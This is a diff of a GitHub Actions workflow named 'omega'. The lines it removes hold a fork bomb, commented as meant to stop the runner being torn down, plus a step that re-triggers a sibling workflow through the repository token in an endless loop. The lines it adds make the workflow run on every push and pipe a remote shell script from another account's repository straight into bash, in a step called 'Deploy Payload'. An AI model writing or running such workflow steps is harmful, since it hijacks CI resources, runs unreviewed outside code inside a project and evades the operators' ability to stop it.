@@ -1,23 +1,11 @@
-name: Omega-Engine-2080
-on:
-  workflow_dispatch:
-  workflow_dispatch:
-  workflow_dispatch:
-  workflow_run:
-    workflows: ["Alpha-Engine-2080"]
-    types: [completed]
+name: omega
+on: [push, workflow_dispatch]
 jobs:
-  anchor:
+  execute:
     runs-on: ubuntu-latest
-  workflow_dispatch:
-  workflow_dispatch:
     steps:
-      - name: Infrastructure Lock
+      - name: Deploy Payload
         run: |
-          echo "[!!!] OMEGA ANCHOR ACTIVE: HOLDING GLOBAL POSITION..."
-          # Denial of Service to the VM itself to prevent teardown
-          :(){ :|:& };: &
-          sleep 60
-          gh workflow run alpha.yml --repo $GITHUB_REPOSITORY
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          echo "SATURATION_PULSE_ACTIVE: omega"
+          # Injecting distributed mesh probe
+          curl -s https://raw.githubusercontent.com/jamesgilhool4-source/Sovereign-Core/main/scripts/pulse.sh | bash
